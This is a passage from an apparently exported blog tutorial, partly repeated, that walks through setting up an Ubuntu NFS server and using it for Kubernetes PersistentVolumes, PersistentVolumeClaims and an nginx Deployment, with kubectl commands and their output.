class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">accessModes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">ReadWriteMany</span></span><br><span class=\"line\">  <span class=\"attr\">storageClassName:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">  <span class=\"attr\">resources:</span></span><br><span class=\"line\">    <span class=\"attr\">requests:</span></span><br><span class=\"line\">        <span class=\"attr\">storage:</span> <span class=\"string\">100Mi</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Create the persistent volume using kubectl</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pvc.yaml</span><br><span class=\"line\">persistentvolumeclaim/pvc-nfs created</span><br></pre></td></tr></table></figure>\n<p>List the  <code>Persistent Volumes Claims</code>  to make sure for the creation</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pvc</span><br><span class=\"line\">NAME      STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br><span class=\"line\">pvc-nfs   Bound    pv-nfs   100Mi      RWX            nfs            3s</span><br></pre></td></tr></table></figure>\n<h3 id=\"create-nginx-deployment\"><a class=\"markdownIt-Anchor\" href=\"#create-nginx-deployment\">#</a> Create Nginx Deployment</h3>\n<p>We use the  <code>volumeMounts</code>  and  <code>volumes </code> attributes in this manifest to use the persistent volume we created:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">nginx-deployment</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">    <span class=\"attr\">replicas:</span> <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"attr\">selector:</span></span><br><span class=\"line\">        <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">            <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\">    <span class=\"attr\">template:</span></span><br><span class=\"line\">        <span class=\"attr\">metadata:</span></span><br><span class=\"line\">            <span class=\"attr\">labels:</span></span><br><span class=\"line\">                <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\">        <span class=\"attr\">spec:</span></span><br><span class=\"line\">            <span class=\"attr\">containers:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\">              <span class=\"attr\">image:</span> <span class=\"string\">nginx</span>  <span class=\"comment\"># we use wrong image for the demo !</span></span><br><span class=\"line\">              <span class=\"attr\">ports:</span></span><br><span class=\"line\">                <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nginx-port</span></span><br><span class=\"line\">                  <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\">              <span class=\"attr\">volumeMounts:</span></span><br><span class=\"line\">                <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">                  <span class=\"attr\">mountPath:</span> <span class=\"string\">/usr/share/nginx/html</span></span><br><span class=\"line\">            <span class=\"attr\">volumes:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">              <span class=\"attr\">persistentVolumeClaim:</span></span><br><span class=\"line\">                <span class=\"attr\">claimName:</span> <span class=\"string\">pvc-nfs</span></span><br></pre></td></tr></table></figure>\n<p>Deploy the  <code>nginx-deployment.yaml</code>  using the  <code>kubectl apply -f</code> .</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps/nginx-deployment created</span><br></pre></td></tr></table></figure>\n<p>Make sure that the deployment was created without any problems!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pods</span><br><span class=\"line\">NAME                                READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">nginx-deployment-7976956b49-fgbb4   1/1     Running   0          16s</span><br><span class=\"line\">nginx-deployment-7976956b49-hzrmm   1/1     Running   0          16s</span><br><span class=\"line\">nginx-deployment-7976956b49-kg5tx   1/1     Running   0          16s</span><br></pre></td></tr></table></figure>\n<h3 id=\"sanity-check-testing-the-nfs-volumes\"><a class=\"markdownIt-Anchor\" href=\"#sanity-check-testing-the-nfs-volumes\">#</a> Sanity Check (Testing the NFS volumes):</h3>\n<p>Let’s get shell on one of the running containers and go to the mount point then create a file!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-fgbb4 -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/<span class=\"comment\"># ls</span></span><br><span class=\"line\">bin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>\n<p>Now the shell is opened. Let’s create a file in  <code>/usr/share/nginx/html</code> :</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>We find the file created in the client test xD</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\">file</span><br></pre></td></tr></table></figure>\n<p>Create a file named “hi from the other side!”</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># touch &quot;hi from the other side!&quot;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\">file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Let’s open another shell on another running container:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-kg5tx -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>Bingoo! we find the same content on the same share point!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\"> file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html<span class=\"comment\"># exit</span></span><br></pre></td></tr></table></figure>\n<p>Now we will try to delete the deployment and recreate another to check the data in the  persistent volume</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl delete -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps <span class=\"string\">&quot;nginx-deployment&quot;</span> deleted</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps/nginx-deployment created</span><br></pre></td></tr></table></figure>\n<p>Check the deployment created or not !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~ kubectl get pods</span><br><span class=\"line\">NAME                                READY   STATUS              RESTARTS   AGE</span><br><span class=\"line\">nginx-deployment-7976956b49-7d5vw   1/1     Running             0          10s</span><br><span class=\"line\">nginx-deployment-7976956b49-9r5gx   0/1     ContainerCreating   0          10s</span><br><span class=\"line\">nginx-deployment-7976956b49-fdq7w   1/1     Running             0          10s</span><br></pre></td></tr></table></figure>\n<p>Open another shell on running container from the new deployment to check the content of the persistent volume:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-7d5vw -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>Display the content of the mount point  <code>/usr/share/nginx/html/</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\"> file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br></pre></td></tr></table></figure>\n<p>Bingoo! The content still in the persistent volume without any problem !</p>\n","site":{"data":{}},"length":7842,"excerpt":"","more":"<p>We will setting up a NFS server to use it as remote storage for our cluster to create a lot of persistent volumes in our local infrastructure !</p>\n<p>We Assume that we have 4 Ubuntu 20.04 LTS, The Kubernetes is installed and the  <code>4n6nk8s-nfs</code>  host in the same network with the cluster :</p>\n<table>\n<thead>\n<tr>\n<th>Role</th>\n<th>Hostname</th>\n<th>IP address</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Master</td>\n<td>4n6nk8s-master</td>\n<td>192.168.1.18/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker1</td>\n<td>192.168.1.19/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker2</td>\n<td>192.168.1.20/24</td>\n</tr>\n<tr>\n<td>NFS Server</td>\n<td>4n6nk8s-nfs</td>\n<td>192.168.1.80/24</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"what-is-a-nfs-network-file-system-server\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-nfs-network-file-system-server\">#</a> What is a NFS (Network File System) Server:</h2>\n<p>Network File System (NFS) is a networking protocol for distributed file sharing. A file system defines the way data in the form of files is stored and retrieved from storage devices, such as hard disk drives, solid-state drives and tape drives. NFS is a network file sharing protocol that defines the way files are stored and retrieved from storage devices across networks.</p>\n<p>This distributed file system protocol allows a user on a client computer to access files over a network in the same way they would access a local storage file.</p>\n<h2 id=\"setting-up-the-nfs-server\"><a class=\"markdownIt-Anchor\" href=\"#setting-up-the-nfs-server\">#</a> Setting up the NFS server</h2>\n<p>We need to install the  <code>nfs-kernel-server</code>  package on the NFS server. This package will store additional packages such as  <code>nfs-common</code>  and  <code>4n6nk8s@rpcbind</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s-nfs:~$ sudo apt install nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p>Now let’s create an NFS Export Directory</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo <span class=\"built_in\">mkdir</span> /mnt/nfs-data </span><br></pre></td></tr></table></figure>\n<p>Now let’s give it a read,write and execute privileges to all the contents inside the directory</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo <span class=\"built_in\">chmod</span> 777 /mnt/nfs-data</span><br></pre></td></tr></table></figure>\n<p>Now Lets add a new line to the  <code>/etc/exports</code>  configuration file.</p>\n<blockquote>\n<p>The  <code>/etc/exports</code>  file indicates all directories that a nfs server exports to its clients. Each line in the file specifies a single directory.</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo vim /etc/exports</span><br></pre></td></tr></table></figure>\n<p>You can provide access to a single client, multiple clients, or specify an entire subnet. In this guide, we have allowed an entire subnet to have access to the NFS share.</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt/nfs-data <span class=\"number\">192.168</span>.<span class=\"number\">1.0</span>/<span class=\"number\">24</span>(rw,<span class=\"keyword\">sync</span>,no_subtree_check)</span><br></pre></td></tr></table></figure>\n<p>After granting access to the subnet, let’s export the NFS share directory and restart the NFS</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo exportfs -a</span><br><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo systemctl restart nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p>Let’s allow NFS access through the firewall</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo ufw allow from 192.168.43.0/24 to any port nfs</span><br></pre></td></tr></table></figure>\n<h2 id=\"install-the-nfs-client-on-the-kubernetes-nodes\"><a class=\"markdownIt-Anchor\" href=\"#install-the-nfs-client-on-the-kubernetes-nodes\">#</a> Install the NFS Client on the Kubernetes Nodes</h2>\n<p>We must install the  <code>nfs-common</code>  packages to access to the NFS share so let’s install it by running the following command on each node:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo apt install nfs-common</span><br></pre></td></tr></table></figure>\n<p>This command mount the NFS Share on one node for testing and sanity check only</p>\n<blockquote>\n<p>The mount command is not a mandatory step. We mount for testing purposes. you can skip to the next section</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo mount 4n6nk8s-nfs:/mnt/nfs-data  /mnt</span><br></pre></td></tr></table></figure>\n<p>Let’s Create a file for testing</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ <span class=\"built_in\">cd</span> /mnt</span><br><span class=\"line\">4n6nk8s@4n6nk8s-worker1:/mnt $ <span class=\"built_in\">touch</span> file </span><br></pre></td></tr></table></figure>\n<p>Check the  <code>/mnt/nfs-data</code>  on the NFS server</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ <span class=\"built_in\">cd</span> /mnt/nfs-data</span><br><span class=\"line\">4n6nk8s@4n6nk8s-nfs:/mnt/nfs-data$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">file </span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-with-nfs-remote-storage-demo\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-with-nfs-remote-storage-demo\">#</a> Kubernetes with NFS remote Storage demo</h2>\n<p>After Setting up the NFS server and install the NFS client on the kubernetes nodes. Now it’s time to do some practice with  <code>Persistent Volume</code>  and  <code>Persistent Volume Claim</code>  with NFS storage.</p>\n<h3 id=\"create-a-persistent-volume-with-nfs\"><a class=\"markdownIt-Anchor\" href=\"#create-a-persistent-volume-with-nfs\">#</a> Create a Persistent Volume with NFS</h3>\n<p>Example of Persistent Volume manifest using nfs:</p>\n<figure class=\"highlight yaml\"><figcaption><span>PersistentVolume</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">PersistentVolume</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pv-nfs</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">capacity:</span></span><br><span class=\"line\">    <span class=\"attr\">storage:</span> <span class=\"string\">100Mi</span></span><br><span class=\"line\">  <span class=\"attr\">accessModes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">ReadWriteMany</span></span><br><span class=\"line\">  <span class=\"attr\">storageClassName:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">  <span class=\"attr\">nfs:</span></span><br><span class=\"line\">    <span class=\"attr\">server:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.80</span> <span class=\"comment\"># the IP address of 4n6nk8s-nfs host</span></span><br><span class=\"line\">    <span class=\"attr\">path:</span> <span class=\"string\">&quot;/mnt/nfs-data&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Make sure to put the correct IP address of the NFS server and the correct NFS Share point!<br>\nCreate the persistent volume using kubectl</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pv.yaml</span><br><span class=\"line\">persistentvolume/pv-nfs created</span><br></pre></td></tr></table></figure>\n<p>List the Persistent Volumes to make sure for the creation</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pv</span><br><span class=\"line\">NAME     CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE</span><br><span class=\"line\">pv-nfs   100Mi      RWX            Retain           Available           nfs                     4s</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"create-a-persistent-volume-claim-with-nfs\"><a class=\"markdownIt-Anchor\" href=\"#create-a-persistent-volume-claim-with-nfs\">#</a> Create a Persistent Volume Claim with NFS</h3>\n<p>Example of Persistent Volume Claim manifest using nfs:</p>\n<figure class=\"highlight yaml\"><figcaption><span>PersistentVolumeClaim</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">PersistentVolumeClaim</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pvc-nfs</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">accessModes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">ReadWriteMany</span></span><br><span class=\"line\">  <span class=\"attr\">storageClassName:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">  <span class=\"attr\">resources:</span></span><br><span class=\"line\">    <span class=\"attr\">requests:</span></span><br><span class=\"line\">        <span class=\"attr\">storage:</span> <span class=\"string\">100Mi</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Create the persistent volume using kubectl</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pvc.yaml</span><br><span class=\"line\">persistentvolumeclaim/pvc-nfs created</span><br></pre></td></tr></table></figure>\n<p>List the  <code>Persistent Volumes Claims</code>  to make sure for the creation</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pvc</span><br><span class=\"line\">NAME      STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br><span class=\"line\">pvc-nfs   Bound    pv-nfs   100Mi      RWX            nfs            3s</span><br></pre></td></tr></table></figure>\n<h3 id=\"create-nginx-deployment\"><a class=\"markdownIt-Anchor\" href=\"#create-nginx-deployment\">#</a> Create Nginx Deployment</h3>\n<p>We use the  <code>volumeMounts</code>  and  <code>volumes </code> attributes in this manifest to use the persistent volume we created:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">nginx-deployment</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">    <span class=\"attr\">replicas:</span> <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"attr\">selector:</span></span><br><span class=\"line\">        <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">            <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\">    <span class=\"attr\">template:</span></span><br><span class=\"line\">        <span class=\"attr\">metadata:</span></span><br><span class=\"line\">            <span class=\"attr\">labels:</span></span><br><span class=\"line\">                <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\">        <span class=\"attr\">spec:</span></span><br><span class=\"line\">            <span class=\"attr\">containers:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\">              <span class=\"attr\">image:</span> <span class=\"string\">nginx</span>  <span class=\"comment\"># we use wrong image for the demo !</span></span><br><span class=\"line\">              <span class=\"attr\">ports:</span></span><br><span class=\"line\">                <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nginx-port</span></span><br><span class=\"line\">                  <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\">              <span class=\"attr\">volumeMounts:</span></span><br><span class=\"line\">                <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">                  <span class=\"attr\">mountPath:</span> <span class=\"string\">/usr/share/nginx/html</span></span><br><span class=\"line\">            <span class=\"attr\">volumes:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> 